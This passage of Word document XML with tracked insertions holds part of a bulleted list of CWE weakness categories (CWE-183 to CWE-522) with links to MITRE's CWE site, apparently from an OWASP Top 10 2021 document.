            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-183: Permissive List of Allowed </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Inputs](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/183.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="156A2A51" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1711" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1712" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-209: Generation of Error Message Containing Sensitive </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Information](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/209.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="24E61408" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1713" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1714" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-213: Exposure of Sensitive Information Due to Incompatible </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Policies](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/213.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="299B4FFF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1715" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1716" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-235: Improper Handling of Extra </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Parameters](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/235.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4658C25A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1717" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1718" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-256: Unprotected Storage of </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Credentials](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/256.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5624D2EE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1719" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1720" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-257: Storing Passwords in a Recoverable </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Format](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/257.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5DBCE54D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1721" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1722" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-266: Incorrect Privilege </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Assignment](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/266.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="32B5A9F1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1723" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1724" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-269: Improper Privilege </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Management](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/269.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7E455CC3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1725" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1726" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-280: Improper Handling of Insufficient Permissions or </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Privileges](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/280.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4604995A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1727" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1728" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-311: Missing Encryption of Sensitive </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Data](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/311.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="397BFCEB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1729" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1730" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-312: Cleartext Storage of Sensitive </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Information](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/312.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="64A29A70" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1731" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1732" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-313: Cleartext Storage in a File or on </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Disk](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/313.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4D0B9713" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1733" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1734" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-316: Cleartext Storage of Sensitive Information in </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Memory](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/316.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="50AF8C51" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1735" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1736" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-419: Unprotected Primary </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Channel](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/419.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="79A6E626" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1737" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1738" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-430: Deployment of Wrong </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Handler](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/430.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="12D84122" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1739" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1740" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-434: Unrestricted Upload of File with Dangerous </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Type](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/434.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0D477C9D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1741" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1742" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request Smuggling'</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https://cwe.mitre.org/data/definitions/444.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0A843C8D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1743" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1744" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t xml:space="preserve">- [CWE-451: User Interface (UI) Misrepresentation of Critical </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Information](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/451.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0E139277" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1745" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1746" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-472: External Control of Assumed-Immutable Web </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Parameter](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/472.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1FE69D46" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1747" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1748" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-501: Trust Boundary </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Violation](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/501.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6D2C4930" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1749" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1750" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-522: Insufficiently Protected </w:t>
